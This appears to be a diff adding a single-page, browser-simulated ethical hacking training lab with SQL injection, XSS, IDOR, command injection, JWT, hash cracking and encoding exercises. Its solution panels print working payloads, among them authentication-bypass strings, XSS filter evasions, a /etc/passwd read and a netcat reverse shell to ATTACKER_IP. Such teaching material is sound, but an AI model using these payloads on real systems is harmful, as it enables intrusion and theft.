@@ -1,0 +1,684 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>HackAgent Labs</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Courier New', monospace;
+            background: #0a0a0a;
+            color: #00ff00;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        h1 {
+            text-align: center;
+            font-size: 32px;
+            text-shadow: 0 0 10px #00ff00;
+            margin-bottom: 10px;
+        }
+        .subtitle {
+            text-align: center;
+            color: #666;
+            margin-bottom: 30px;
+        }
+        .tabs {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+        .tab {
+            padding: 10px 20px;
+            background: #1a1a1a;
+            border: 1px solid #333;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .tab:hover { border-color: #00ff00; }
+        .tab.active {
+            background: #0f3d0f;
+            border-color: #00ff00;
+        }
+        .lab-container {
+            display: none;
+            background: #111;
+            border: 1px solid #333;
+            border-radius: 10px;
+            padding: 20px;
+        }
+        .lab-container.active { display: block; }
+        h2 {
+            border-bottom: 1px solid #333;
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+        }
+        .description {
+            color: #888;
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+        .input-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #00ff00;
+        }
+        input, textarea {
+            width: 100%;
+            padding: 10px;
+            background: #1a1a1a;
+            border: 1px solid #333;
+            color: #00ff00;
+            font-family: inherit;
+            border-radius: 5px;
+        }
+        input:focus, textarea:focus {
+            outline: none;
+            border-color: #00ff00;
+        }
+        button {
+            padding: 10px 25px;
+            background: #00ff00;
+            color: black;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            font-family: inherit;
+            margin-right: 10px;
+            margin-bottom: 10px;
+        }
+        button:hover { background: #00cc00; }
+        button.secondary {
+            background: #333;
+            color: #00ff00;
+        }
+        .output {
+            background: #0a0a0a;
+            border: 1px solid #333;
+            padding: 15px;
+            margin-top: 15px;
+            border-radius: 5px;
+            min-height: 100px;
+            white-space: pre-wrap;
+            font-size: 14px;
+        }
+        .success { color: #00ff00; }
+        .error { color: #ff0000; }
+        .warning { color: #ffaa00; }
+        .info { color: #0088ff; }
+        .hint {
+            background: #1a1a2e;
+            border-left: 3px solid #0088ff;
+            padding: 10px;
+            margin: 10px 0;
+        }
+        .vuln-found {
+            background: #1a0000;
+            border: 1px solid #ff0000;
+            padding: 15px;
+            border-radius: 5px;
+            margin-top: 15px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 15px 0;
+        }
+        th, td {
+            padding: 10px;
+            border: 1px solid #333;
+            text-align: left;
+        }
+        th { background: #1a1a1a; }
+        code {
+            background: #1a1a1a;
+            padding: 2px 6px;
+            border-radius: 3px;
+        }
+        .user-badge {
+            display: inline-block;
+            padding: 5px 10px;
+            background: #0f3d0f;
+            border-radius: 5px;
+            margin-bottom: 15px;
+        }
+    </style>
+</head>
+<body>
+    <h1>🔥 HackAgent Labs</h1>
+    <p class="subtitle">Interactive Ethical Hacking Practice</p>
+    
+    <div class="tabs">
+        <div class="tab active" onclick="showLab('sqli')">SQL Injection</div>
+        <div class="tab" onclick="showLab('xss')">XSS</div>
+        <div class="tab" onclick="showLab('idor')">IDOR</div>
+        <div class="tab" onclick="showLab('cmdi')">Command Injection</div>
+        <div class="tab" onclick="showLab('jwt')">JWT Attacks</div>
+        <div class="tab" onclick="showLab('hash')">Password Cracking</div>
+        <div class="tab" onclick="showLab('encoding')">Encoding</div>
+    </div>
+
+    <!-- SQL INJECTION LAB -->
+    <div id="lab-sqli" class="lab-container active">
+        <h2>💉 SQL Injection Lab</h2>
+        <div class="description">
+            The login form below is vulnerable to SQL injection. The backend query is:<br>
+            <code>SELECT * FROM users WHERE username='INPUT' AND password='INPUT'</code>
+        </div>
+        
+        <div class="hint">
+            <strong>Hints:</strong> Try closing the string with <code>'</code> and commenting out the rest with <code>--</code>
+        </div>
+        
+        <div class="input-group">
+            <label>Username:</label>
+            <input type="text" id="sqli-user" placeholder="Enter username...">
+        </div>
+        <div class="input-group">
+            <label>Password:</label>
+            <input type="password" id="sqli-pass" placeholder="Enter password...">
+        </div>
+        
+        <button onclick="testSQLi()">Login</button>
+        <button class="secondary" onclick="showSQLiSolution()">Show Solution</button>
+        
+        <div id="sqli-output" class="output"></div>
+    </div>
+
+    <!-- XSS LAB -->
+    <div id="lab-xss" class="lab-container">
+        <h2>🎭 Cross-Site Scripting (XSS) Lab</h2>
+        <div class="description">
+            The search results below reflect user input without sanitization.<br>
+            Try to execute JavaScript in the page!
+        </div>
+        
+        <div class="hint">
+            <strong>Hints:</strong> Try <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> or <code>&lt;img src=x onerror=alert('XSS')&gt;</code>
+        </div>
+        
+        <div class="input-group">
+            <label>Search:</label>
+            <input type="text" id="xss-input" placeholder="Search for products...">
+        </div>
+        
+        <select id="xss-level" style="padding: 10px; background: #1a1a1a; color: #00ff00; border: 1px solid #333; margin-bottom: 15px;">
+            <option value="low">Security: LOW</option>
+            <option value="medium">Security: MEDIUM (&lt;script&gt; blocked)</option>
+            <option value="high">Security: HIGH (more filters)</option>
+        </select>
+        
+        <button onclick="testXSS()">Search</button>
+        <button class="secondary" onclick="showXSSSolution()">Show Solution</button>
+        
+        <div id="xss-output" class="output"></div>
+        <div id="xss-render"></div>
+    </div>
+
+    <!-- IDOR LAB -->
+    <div id="lab-idor" class="lab-container">
+        <h2>🔓 IDOR Lab (Insecure Direct Object Reference)</h2>
+        <div class="description">
+            You are logged in as User ID 1 (John). The API doesn't verify if you're authorized to view other users' data.
+        </div>
+        
+        <div class="user-badge">👤 Logged in as: John (User ID: 1)</div>
+        
+        <div class="hint">
+            <strong>Challenge:</strong> Access the admin's profile (User ID: 2) and check their balance!
+        </div>
+        
+        <div class="input-group">
+            <label>API Request: GET /api/users/</label>
+            <input type="number" id="idor-id" value="1" min="1" max="5" style="width: 100px;">
+        </div>
+        
+        <button onclick="testIDOR('profile')">Get Profile</button>
+        <button onclick="testIDOR('balance')">Get Balance</button>
+        
+        <div id="idor-output" class="output"></div>
+    </div>
+
+    <!-- COMMAND INJECTION LAB -->
+    <div id="lab-cmdi" class="lab-container">
+        <h2>💻 Command Injection Lab</h2>
+        <div class="description">
+            This ping utility executes: <code>ping -c 1 [YOUR INPUT]</code><br>
+            Try to execute additional commands!
+        </div>
+        
+        <div class="hint">
+            <strong>Hints:</strong> Command separators: <code>;</code> <code>&&</code> <code>||</code> <code>|</code>
+        </div>
+        
+        <div class="input-group">
+            <label>IP Address to ping:</label>
+            <input type="text" id="cmdi-input" placeholder="127.0.0.1">
+        </div>
+        
+        <button onclick="testCMDi()">Ping</button>
+        <button class="secondary" onclick="showCMDiSolution()">Show Solution</button>
+        
+        <div id="cmdi-output" class="output"></div>
+    </div>
+
+    <!-- JWT LAB -->
+    <div id="lab-jwt" class="lab-container">
+        <h2>🔐 JWT Security Lab</h2>
+        <div class="description">
+            Learn about JWT (JSON Web Token) vulnerabilities.
+        </div>
+        
+        <div class="input-group">
+            <label>JWT Token:</label>
+            <textarea id="jwt-input" rows="3" placeholder="Paste JWT here...">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiam9obiIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</textarea>
+        </div>
+        
+        <button onclick="decodeJWT()">Decode JWT</button>
+        <button onclick="forgeJWT()">Forge Admin Token</button>
+        <button class="secondary" onclick="showJWTAttacks()">Show Attacks</button>
+        
+        <div id="jwt-output" class="output"></div>
+    </div>
+
+    <!-- PASSWORD CRACKING LAB -->
+    <div id="lab-hash" class="lab-container">
+        <h2>🔑 Password Cracking Lab</h2>
+        <div class="description">
+            Identify and crack password hashes using dictionary attacks.
+        </div>
+        
+        <table>
+            <tr><th>Hash</th><th>Type</th><th>Status</th></tr>
+            <tr><td><code>5f4dcc3b5aa765d61d8327deb882cf99</code></td><td id="hash1-type">?</td><td id="hash1-status">Not cracked</td></tr>
+            <tr><td><code>e10adc3949ba59abbe56e057f20f883e</code></td><td id="hash2-type">?</td><td id="hash2-status">Not cracked</td></tr>
+            <tr><td><code>5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8</code></td><td id="hash3-type">?</td><td id="hash3-status">Not cracked</td></tr>
+        </table>
+        
+        <div class="input-group">
+            <label>Hash to crack:</label>
+            <input type="text" id="hash-input" placeholder="Paste hash here...">
+        </div>
+        
+        <button onclick="identifyHash()">Identify Hash</button>
+        <button onclick="crackHash()">Crack Hash</button>
+        
+        <div id="hash-output" class="output"></div>
+    </div>
+
+    <!-- ENCODING LAB -->
+    <div id="lab-encoding" class="lab-container">
+        <h2>🔄 Encoding/Decoding Lab</h2>
+        <div class="description">
+            Learn common encodings used in web security.
+        </div>
+        
+        <div class="input-group">
+            <label>Input:</label>
+            <textarea id="enc-input" rows="2" placeholder="Enter text to encode/decode..."></textarea>
+        </div>
+        
+        <button onclick="encode('base64')">Base64 Encode</button>
+        <button onclick="decode('base64')">Base64 Decode</button>
+        <button onclick="encode('url')">URL Encode</button>
+        <button onclick="decode('url')">URL Decode</button>
+        <button onclick="encode('hex')">Hex Encode</button>
+        <button onclick="decode('hex')">Hex Decode</button>
+        
+        <div id="enc-output" class="output"></div>
+    </div>
+
+    <script>
+        // Tab switching
+        function showLab(name) {
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.lab-container').forEach(l => l.classList.remove('active'));
+            event.target.classList.add('active');
+            document.getElementById('lab-' + name).classList.add('active');
+        }
+
+        // SQL Injection
+        const users = {
+            'admin': { password: 'supersecret123', role: 'admin', email: 'admin@company.com' },
+            'john': { password: 'john123', role: 'user', email: 'john@example.com' },
+            'jane': { password: 'janepass', role: 'user', email: 'jane@example.com' }
+        };
+
+        function testSQLi() {
+            const user = document.getElementById('sqli-user').value;
+            const pass = document.getElementById('sqli-pass').value;
+            const out = document.getElementById('sqli-output');
+            
+            // Check for SQL injection patterns
+            const sqliPatterns = [
+                /'.*--/i,
+                /' or '.*'.*'/i,
+                /' or 1.*=.*1/i,
+                /union.*select/i
+            ];
+            
+            let injected = sqliPatterns.some(p => p.test(user) || p.test(pass));
+            
+            if (injected) {
+                out.innerHTML = '<span class="error">[!] SQL INJECTION DETECTED!</span>\n\n';
+                
+                if (user.includes("'--") || user.includes("' --")) {
+                    const extractedUser = user.split("'")[0].trim();
+                    if (users[extractedUser]) {
+                        out.innerHTML += '<span class="success">[+] SUCCESS! Logged in as: ' + extractedUser + '</span>\n';
+                        out.innerHTML += '[+] Role: ' + users[extractedUser].role + '\n';
+                        out.innerHTML += '[+] Email: ' + users[extractedUser].email + '\n\n';
+                        out.innerHTML += '<span class="info">[*] Query became: SELECT * FROM users WHERE username=\'' + extractedUser + '\'--\' AND password=\'...\'\n';
+                        out.innerHTML += '[*] Everything after -- was treated as a comment!</span>';
+                    }
+                } else if (/or/i.test(user) || /or/i.test(pass)) {
+                    out.innerHTML += '<span class="success">[+] SUCCESS! Authentication bypassed!</span>\n';
+                    out.innerHTML += '[+] Logged in as first user in database: admin\n';
+                    out.innerHTML += '[+] Role: admin\n\n';
+                    out.innerHTML += '<span class="info">[*] Your OR condition made the WHERE clause always TRUE!</span>';
+                }
+            } else {
+                // Normal auth
+                if (users[user] && users[user].password === pass) {
+                    out.innerHTML = '<span class="success">[+] Welcome, ' + user + '!</span>\n[+] Role: ' + users[user].role;
+                } else {
+                    out.innerHTML = '<span class="error">[-] Invalid username or password!</span>';
+                }
+            }
+        }
+
+        function showSQLiSolution() {
+            document.getElementById('sqli-output').innerHTML = 
+                '<span class="info">Solutions:</span>\n\n' +
+                '1. <code>admin\'--</code> (password can be anything)\n' +
+                '   → Comments out password check\n\n' +
+                '2. <code>\' OR \'1\'=\'1</code> in both fields\n' +
+                '   → Makes condition always TRUE\n\n' +
+                '3. <code>\' OR 1=1--</code> as username\n' +
+                '   → Returns all users';
+        }
+
+        // XSS
+        function testXSS() {
+            const input = document.getElementById('xss-input').value;
+            const level = document.getElementById('xss-level').value;
+            const out = document.getElementById('xss-output');
+            const render = document.getElementById('xss-render');
+            
+            let filtered = input;
+            let blocked = false;
+            
+            if (level === 'medium') {
+                if (/<script/i.test(input)) {
+                    blocked = true;
+                    out.innerHTML = '<span class="error">[-] BLOCKED! &lt;script&gt; tag filtered</span>';
+                }
+            } else if (level === 'high') {
+                if (/<script|onerror|onload|onclick|onmouseover/i.test(input)) {
+                    blocked = true;
+                    out.innerHTML = '<span class="error">[-] BLOCKED! Dangerous pattern detected</span>';
+                }
+            }
+            
+            if (!blocked) {
+                // Check for XSS
+                const xssPatterns = [
+                    /<script.*>.*<\/script>/i,
+                    /<.*\s+on\w+\s*=/i,
+                    /javascript:/i,
+                    /<svg.*>/i,
+                    /<img.*onerror/i,
+                    /<iframe/i
+                ];
+                
+                let xssFound = xssPatterns.some(p => p.test(input));
+                
+                if (xssFound) {
+                    out.innerHTML = '<span class="success">[+] XSS DETECTED!</span>\n';
+                    out.innerHTML += '[+] Your payload would execute in a real browser!\n\n';
+                    out.innerHTML += '<span class="warning">[!] Rendering sanitized preview below...</span>';
+                    render.innerHTML = '<div class="vuln-found">Search results for: ' + input.replace(/</g, '&lt;').replace(/>/g, '&gt;') + '</div>';
+                } else {
+                    out.innerHTML = 'Search results for: ' + input.replace(/</g, '&lt;').replace(/>/g, '&gt;');
+                    render.innerHTML = '';
+                }
+            }
+        }
+
+        function showXSSSolution() {
+            document.getElementById('xss-output').innerHTML = 
+                '<span class="info">Solutions by security level:</span>\n\n' +
+                'LOW:\n<code>&lt;script&gt;alert(\'XSS\')&lt;/script&gt;</code>\n\n' +
+                'MEDIUM (script blocked):\n<code>&lt;img src=x onerror=alert(\'XSS\')&gt;</code>\n<code>&lt;svg onload=alert(\'XSS\')&gt;</code>\n\n' +
+                'HIGH:\n<code>&lt;details open ontoggle=alert(\'XSS\')&gt;</code>\n<code>&lt;marquee onstart=alert(\'XSS\')&gt;</code>';
+        }
+
+        // IDOR
+        const idorUsers = {
+            1: { name: 'John', email: 'john@example.com', balance: 1000, role: 'user' },
+            2: { name: 'Admin', email: 'admin@company.com', balance: 99999, role: 'admin' },
+            3: { name: 'Jane', email: 'jane@example.com', balance: 500, role: 'user' },
+            4: { name: 'Bob', email: 'bob@example.com', balance: 2500, role: 'user' },
+            5: { name: 'Secret', email: 'secret@company.com', balance: 1000000, role: 'superadmin' }
+        };
+
+        function testIDOR(type) {
+            const id = parseInt(document.getElementById('idor-id').value);
+            const out = document.getElementById('idor-output');
+            const currentUser = 1;
+            
+            if (!idorUsers[id]) {
+                out.innerHTML = '<span class="error">[-] User not found!</span>';
+                return;
+            }
+            
+            const user = idorUsers[id];
+            
+            if (id !== currentUser) {
+                out.innerHTML = '<span class="error">[!] IDOR VULNERABILITY!</span>\n';
+                out.innerHTML += '<span class="success">[+] You accessed User ' + id + '\'s data (not your own)!</span>\n\n';
+            } else {
+                out.innerHTML = '<span class="info">[+] Your ' + type + ':</span>\n\n';
+            }
+            
+            if (type === 'profile') {
+                out.innerHTML += 'Name: ' + user.name + '\n';
+                out.innerHTML += 'Email: ' + user.email + '\n';
+                out.innerHTML += 'Role: ' + user.role;
+                
+                if (id === 2) out.innerHTML += '\n\n<span class="warning">[!] You found the admin account!</span>';
+                if (id === 5) out.innerHTML += '\n\n<span class="warning">[!] SECRET SUPERADMIN FOUND!</span>';
+            } else {
+                out.innerHTML += 'Balance: $' + user.balance.toLocaleString();
+                
+                if (id === 2) out.innerHTML += '\n\n<span class="warning">[!] Admin has $99,999!</span>';
+                if (id === 5) out.innerHTML += '\n\n<span class="warning">[!] JACKPOT! $1,000,000!</span>';
+            }
+        }
+
+        // Command Injection
+        function testCMDi() {
+            const input = document.getElementById('cmdi-input').value;
+            const out = document.getElementById('cmdi-output');
+            
+            out.innerHTML = '<span class="info">[Executing]: ping -c 1 ' + input + '</span>\n\n';
+            
+            const injectionChars = [';', '&&', '||', '|', '$(', '`'];
+            let injected = injectionChars.some(c => input.includes(c));
+            
+            if (injected) {
+                out.innerHTML += '<span class="error">[!] COMMAND INJECTION DETECTED!</span>\n\n';
+                
+                // Parse commands
+                const parts = input.split(/[;&|]+/).filter(p => p.trim());
+                parts.forEach((part, i) => {
+                    part = part.trim();
+                    if (i === 0) {
+                        out.innerHTML += '[1] ping -c 1 ' + part + '\n';
+                    } else {
+                        out.innerHTML += '[' + (i+1) + '] ' + part + '\n';
+                    }
+                });
+                
+                out.innerHTML += '\n<span class="success">[Simulated Output]:</span>\n';
+                
+                if (input.includes('whoami')) out.innerHTML += 'www-data\n';
+                if (input.includes('id')) out.innerHTML += 'uid=33(www-data) gid=33(www-data)\n';
+                if (/cat.*passwd/.test(input)) {
+                    out.innerHTML += 'root:x:0:0:root:/root:/bin/bash\n';
+                    out.innerHTML += 'www-data:x:33:33:www-data:/var/www:/bin/sh\n';
+                }
+                if (input.includes('ls')) out.innerHTML += 'index.php  config.php  uploads/  admin/\n';
+                if (/nc|netcat/.test(input)) out.innerHTML += '<span class="warning">[!] Reverse shell attempt!</span>\n';
+                
+                out.innerHTML += '\n<span class="info">[*] Your injected commands would execute on the server!</span>';
+            } else {
+                out.innerHTML += 'PING 127.0.0.1 (127.0.0.1): 1 data bytes\n';
+                out.innerHTML += '64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.042 ms\n';
+                out.innerHTML += '\n<span class="info">[-] No injection detected. Try adding ; or && followed by a command!</span>';
+            }
+        }
+
+        function showCMDiSolution() {
+            document.getElementById('cmdi-output').innerHTML = 
+                '<span class="info">Solutions:</span>\n\n' +
+                '<code>127.0.0.1; whoami</code> → Shows current user\n' +
+                '<code>127.0.0.1; cat /etc/passwd</code> → Reads password file\n' +
+                '<code>127.0.0.1 && id</code> → Shows user/group IDs\n' +
+                '<code>127.0.0.1 | ls -la</code> → Lists directory\n' +
+                '<code>127.0.0.1; nc -e /bin/sh ATTACKER_IP 4444</code> → Reverse shell!';
+        }
+
+        // JWT
+        function decodeJWT() {
+            const jwt = document.getElementById('jwt-input').value.trim();
+            const out = document.getElementById('jwt-output');
+            
+            try {
+                const parts = jwt.split('.');
+                if (parts.length !== 3) throw new Error('Invalid JWT format');
+                
+                const header = JSON.parse(atob(parts[0]));
+                const payload = JSON.parse(atob(parts[1]));
+                
+                out.innerHTML = '<span class="success">[+] JWT Decoded!</span>\n\n';
+                out.innerHTML += '<span class="info">Header:</span>\n' + JSON.stringify(header, null, 2) + '\n\n';
+                out.innerHTML += '<span class="info">Payload:</span>\n' + JSON.stringify(payload, null, 2) + '\n\n';
+                out.innerHTML += '<span class="warning">[!] Note: JWT payload is NOT encrypted, just Base64 encoded!</span>';
+            } catch (e) {
+                out.innerHTML = '<span class="error">[-] Invalid JWT: ' + e.message + '</span>';
+            }
+        }
+
+        function forgeJWT() {
+            const out = document.getElementById('jwt-output');
+            
+            const header = { alg: "none", typ: "JWT" };
+            const payload = { user: "admin", role: "admin", iat: Date.now() };
+            
+            const forged = btoa(JSON.stringify(header)) + '.' + btoa(JSON.stringify(payload)) + '.';
+            
+            out.innerHTML = '<span class="success">[+] Forged Admin Token (None Algorithm Attack):</span>\n\n';
+            out.innerHTML += '<code>' + forged + '</code>\n\n';
+            out.innerHTML += '<span class="info">Header:</span> ' + JSON.stringify(header) + '\n';
+            out.innerHTML += '<span class="info">Payload:</span> ' + JSON.stringify(payload) + '\n\n';
+            out.innerHTML += '<span class="warning">[!] If server accepts "alg: none", no signature needed!</span>';
+        }
+
+        function showJWTAttacks() {
+            document.getElementById('jwt-output').innerHTML = 
+                '<span class="info">JWT Attack Techniques:</span>\n\n' +
+                '1. <span class="warning">None Algorithm</span>\n' +
+                '   Change alg to "none", remove signature\n\n' +
+                '2. <span class="warning">Algorithm Confusion</span>\n' +
+                '   Change RS256 → HS256, sign with public key\n\n' +
+                '3. <span class="warning">Weak Secret</span>\n' +
+                '   Brute force with hashcat: hashcat -m 16500 jwt.txt wordlist.txt\n\n' +
+                '4. <span class="warning">Key Injection</span>\n' +
+                '   Some libs allow key in header (jku, x5u)';
+        }
+
+        // Hash Cracking
+        const hashDB = {
+            '5f4dcc3b5aa765d61d8327deb882cf99': { type: 'MD5', password: 'password' },
+            'e10adc3949ba59abbe56e057f20f883e': { type: 'MD5', password: '123456' },
+            'd8578edf8458ce06fbc5bb76a58c5ca4': { type: 'MD5', password: 'qwerty' },
+            '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8': { type: 'SHA1', password: 'password' },
+            '8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92': { type: 'SHA256', password: '123456' }
+        };
+
+        function identifyHash() {
+            const hash = document.getElementById('hash-input').value.trim().toLowerCase();
+            const out = document.getElementById('hash-output');
+            const len = hash.length;
+            
+            out.innerHTML = '<span class="info">[Analyzing hash: ' + hash.substring(0,20) + '...]</span>\n';
+            out.innerHTML += '[Length: ' + len + ' characters]\n\n';
+            
+            if (len === 32) out.innerHTML += '<span class="success">[+] Likely MD5 (32 hex chars)</span>';
+            else if (len === 40) out.innerHTML += '<span class="success">[+] Likely SHA1 (40 hex chars)</span>';
+            else if (len === 64) out.innerHTML += '<span class="success">[+] Likely SHA256 (64 hex chars)</span>';
+            else if (len === 128) out.innerHTML += '<span class="success">[+] Likely SHA512 (128 hex chars)</span>';
+            else out.innerHTML += '<span class="warning">[-] Unknown hash type</span>';
+        }
+
+        function crackHash() {
+            const hash = document.getElementById('hash-input').value.trim().toLowerCase();
+            const out = document.getElementById('hash-output');
+            
+            if (hashDB[hash]) {
+                out.innerHTML = '<span class="success">[+] CRACKED!</span>\n\n';
+                out.innerHTML += 'Hash: ' + hash + '\n';
+                out.innerHTML += 'Type: ' + hashDB[hash].type + '\n';
+                out.innerHTML += 'Password: <span class="success">' + hashDB[hash].password + '</span>';
+                
+                // Update table
+                if (hash === '5f4dcc3b5aa765d61d8327deb882cf99') {
+                    document.getElementById('hash1-type').textContent = 'MD5';
+                    document.getElementById('hash1-status').innerHTML = '<span class="success">password</span>';
+                }
+            } else {
+                out.innerHTML = '<span class="error">[-] Hash not found in database</span>\n';
+                out.innerHTML += '<span class="info">[*] Try the sample hashes from the table above!</span>';
+            }
+        }
+
+        // Encoding
+        function encode(type) {
+            const input = document.getElementById('enc-input').value;
+            const out = document.getElementById('enc-output');
+            let result = '';
+            
+            try {
+                if (type === 'base64') result = btoa(input);
+                else if (type === 'url') result = encodeURIComponent(input);
+                else if (type === 'hex') result = Array.from(input).map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
+                
+                out.innerHTML = '<span class="success">[+] ' + type.toUpperCase() + ' Encoded:</span>\n\n' + result;
+            } catch (e) {
+                out.innerHTML = '<span class="error">[-] Error: ' + e.message + '</span>';
+            }
+        }
+
+        function decode(type) {
+            const input = document.getElementById('enc-input').value;
+            const out = document.getElementById('enc-output');
+            let result = '';
+            
+            try {
+                if (type === 'base64') result = atob(input);
+                else if (type === 'url') result = decodeURIComponent(input);
+                else if (type === 'hex') result = input.match(/.{2}/g).map(h => String.fromCharCode(parseInt(h, 16))).join('');
+                
+                out.innerHTML = '<span class="success">[+] Decoded:</span>\n\n' + result;
+            } catch (e) {
+                out.innerHTML = '<span class="error">[-] Error: ' + e.message + '</span>';
+            }
+        }
+    </script>
+</body>
+</html>
